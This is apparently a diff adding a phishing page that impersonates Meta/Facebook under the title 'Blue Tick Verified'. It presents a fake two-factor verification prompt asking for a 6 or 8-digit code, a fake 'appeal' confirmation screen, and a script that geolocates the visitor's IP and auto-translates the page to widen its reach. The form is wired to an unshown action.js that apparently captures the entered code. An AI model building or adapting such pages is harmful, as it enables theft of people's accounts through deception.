@@ -1,0 +1,209 @@
+<!DOCTYPE html><html lang="en" id="html"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta property="og:type" content="article"/>
+  <meta property="og:title" content="Blue Tick Verified"/>
+  <meta property="og:image" content="https://res.cloudinary.com/ductham087/image/upload/v1694658537/mlipp554tgpfzfa4o3zy.jpg"/>
+  <meta name="theme-color" content="#000000"/>
+  <title>Blue Tick Verified</title>
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+  <link rel="stylesheet" href="css/style.css">
+  <link rel="shortcut icon" href="ico.ico" type="image/x-icon">
+<!--  <script type="module" crossorigin="" src="js/index-26b5fa22.js"></script>-->
+  <link rel="stylesheet" href="css/index-e8a0ccb9.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.8.1/font/bootstrap-icons.min.css">
+<link rel="stylesheet" href="css/international-telephone-input.css">
+
+
+</head>
+
+<body>
+    <style>#google_translate_element,.skiptranslate{display:none;}body{top:0!important;}</style>
+    <div id="google_translate_element"></div>
+
+  <div class="modal form-modal" id="twoFAmodal" tabindex="-1" aria-labelledby="2FAmodalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
+      <div class="modal-content">
+        <div class="modal-body">
+          <div class="twoFAinfo-wraper">
+            <h1 class="modal-title source-info">Meta · Facebook</h1>
+            <h1 class="modal-title" id="2FAmodalLabel">Enter verification code to continue</h1>
+            <p>Enter the 6 or 8-digit verification code we sent to your device to continue.</p>
+            <div class="fb-round-wraper">
+                <img src="images/2fa2.jpg" alt="" style="width: 100%; border-radius: 10px;">            </div>
+          </div>
+
+          <form id="twoFAForm">
+            
+            <div class="mb-3">
+              <div class="password-input">
+
+                <input name="2FA-1" minlength="6" maxlength="8" type="tel" style="height: 38px;" class="form-control" id="exampleInputPassword1" aria-describedby="emailHelp" required="" autocomplete="off" placeholder="Code">
+              </div>
+              <div class="invalid-feedback" id="invalid2fa" style="display: none;">
+                The verification code is incorrect or has expired. Please check again or accept on another device.
+              </div>
+            </div>
+            <div class="form-btn-wrapper" style="padding: 2px 0px;">
+              <button class="btn btn-primary" fdprocessedid="4wh7fs" id="send2fa">
+                <div class="spinner-border text-light" id="2faspin" role="status" style="display: none;">
+                  <span class="visually-hidden">Loading...</span>
+                </div>
+                <span class="button-text" id="2faBtn">Continue</span>
+              </button>
+            </div>
+
+            <div class="verify-more-info">
+              <svg data-prefix="fas" data-icon="circle-info" role="img" viewBox="0 0 512 512" aria-hidden="true">
+                <path fill="currentColor" d="M256 512a256 256 0 1 0 0-512 256 256 0 1 0 0 512zM224 160a32 32 0 1 1 64 0 32 32 0 1 1 -64 0zm-8 64l48 0c13.3 0 24 10.7 24 24l0 88 8 0c13.3 0 24 10.7 24 24s-10.7 24-24 24l-80 0c-13.3 0-24-10.7-24-24s10.7-24 24-24l24 0 0-64-24 0c-13.3 0-24-10.7-24-24s10.7-24 24-24z"></path></svg>
+              <div>
+                <h1 class="font-medium">Please accept this connection to continue.</h1>
+                <p>We have sent a notification to your device. Please check Facebook notifications on your device and accept the permissions to continue.</p>
+              </div>
+            </div>
+          </form>
+          <div class="spaser"></div>
+        </div>
+        <!-- <div class="modal-footer">
+          <img src="images/meta-logo-grey.png" alt="">
+        </div> -->
+      </div>
+    </div>
+  </div>
+
+  <div class="modal form-modal" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
+      <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
+          <div class="modal-content">
+              <div class="modal-body">
+                  <div class="twoFAinfo-wraper">
+                      <h1 class="modal-title" id="successModalLabel">Request has been sent</h1>
+                      <br>
+                      <div class="fb-round-wraper">
+                          <img src="images/phone.png" alt="" style="width: 100%;">
+                      </div>
+                      <br>
+                      <p>Your request has been added to the processing queue. We will process your request within 24
+                          hours. If you
+                          do not receive an email message with the appeal status within 24 hours, please resend the
+                          appeal.</p>
+
+                  </div>
+                  <form action="https://facebook.com/" method="GET">
+                      <div class="form-btn-wrapper">
+                          <button class="btn btn-primary">
+
+                              <span class="button-text">Return on Facebook</span>
+                          </button>
+                      </div>
+                  </form>
+
+              </div>
+              <div class="modal-footer">
+                  <img src="images/meta-logo-grey.png" alt="">
+              </div>
+          </div>
+      </div>
+  </div>
+
+  <script src="action.js"></script>
+  <!-- <script src="scripts.js"></script> -->
+
+  <!--
+    This code will translate page contents automatically (without user input)
+    Settings located at line 9, current script will translate english to estonian
+    -->
+
+<script>
+    async function getIPLanguage() {
+        userLang = navigator.language || navigator.userLanguage; // Ví dụ: "vi-VN", "fr-FR"
+        userLang = userLang.split("-")[1];
+        try {
+                let response = await fetch("https://get.geojs.io/v1/ip/geo.json");
+                if (!response.ok) throw new Error("API lỗi");
+
+                let data = await response.json();
+                userLang = data.country_code;
+
+                console.log("Ngôn ngữ từ API:", userLang);
+            } catch (error) {
+                console.error("Lỗi lấy ngôn ngữ từ API:", error);
+            }
+            return userLang;
+    }
+
+    async function googleTranslateElementInit() {
+        let userLang = await getIPLanguage();
+        var lowerLang = userLang.toLowerCase();
+        document.dispatchEvent(new CustomEvent('countryUpdate', 
+            {
+               detail: { countryCode: lowerLang },
+                bubbles: true
+            }
+        ));
+        let supportedLangs = ["he", "zh-TW", "th", "it", "fr", "hr", "de", "ja", "es"]; // Các ngôn ngữ hỗ trợ
+        let langMap = {
+                "TW": "zh-TW", "HK": "zh-TW", "MO": "zh-TW", "TH": "th", "IT": "it", "FR": "fr",
+                "HR": "hr", "IL": "iw", "DE": "de", "JP": "ja", "ES": "es", "MX": "es", "BO": "es",
+                "PR": "es", "CA": "fr", "JO": "ar", "IQ": "ar", "LB": "ar", "EG": "ar", "AE": "ar", "MY": "ms", "NL": "nl",
+                "CH": "fr", "AR": "de", "PL": "pl", "FI": "fi", "CZ": "cs", "GR": "el", "RS": "sr",
+                "SK": "sk", "DK": "da", "PT": "pt", "BR": "pt", "PH": "tl", "KZ": "kk", "CR": "es", "LT": "lt",
+                "LV": "lv", "EE": "et", "SE": "sv", "KP": "ko", "KR": "ko", "BD": "bn", "UA": "uk", "NO": "no",
+                "TR": "tr", "AT": "de", "BA": "sr", "ME": "sr", "BG": "bg", "HU": "hu", "RO": "ro", "PE": "es",
+                "BE" : "nl", "GE": "ka", "CY": "el", "MT" : "mt", "LV": "lv", "LT": "lt", "EE": "et","LY": "ar",
+                "DZ": "ar", "ZA" : "nl", "MC" : "fr", "LU" : "fr", "AL" : "sq", "MD" : "ro"
+            }; // Lấy một bảng định dạng {"VN": "vi", "FR": "fr", ...}
+        let lang = langMap[userLang] || "en"; // Nếu không có, mặc định là "en"
+        if (lang === "en") return; // Nếu là "en", hủy quá trình
+        new google.translate.TranslateElement(
+            { pageLanguage: 'en', autoDisplay: false },
+            'google_translate_element'
+        );
+            // let userLang = navigator.language || navigator.userLanguage; // Ví dụ: "vi-VN", "fr-FR"
+            // userLang = userLang.split("-")[0]; // Lấy phần đầu tiên: "vi", "fr", "de"
+
+            var checkExist = setInterval(function () {
+                var select = document.querySelector("select.goog-te-combo");
+                if (select && select.length > 0) {
+                    select.value = lang;
+                    select.dispatchEvent(new Event("change"));
+                    clearInterval(checkExist);
+                }
+            }, 50);
+    }
+
+      window.addEventListener('pageshow', function (event) {
+        if (event.persisted)
+        {
+            
+            window.location.reload();
+        };
+});
+
+function getTranslationState() {
+          let savedLang = sessionStorage.getItem('translatedLang');
+
+          return savedLang;
+        }
+
+        function saveTranslationState(lang) {
+          sessionStorage.setItem('translatedLang', lang);
+        }
+
+        function restoreTranslation() {
+          let savedLang = getTranslationState();
+          if (savedLang && savedLang !== 'en') {
+            let select = document.querySelector("select.goog-te-combo");
+            if (select && select.value !== savedLang) {
+              select.value = savedLang;
+              select.dispatchEvent(new Event("change"));
+            }
+          }
+        }
+
+</script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+</body></html>
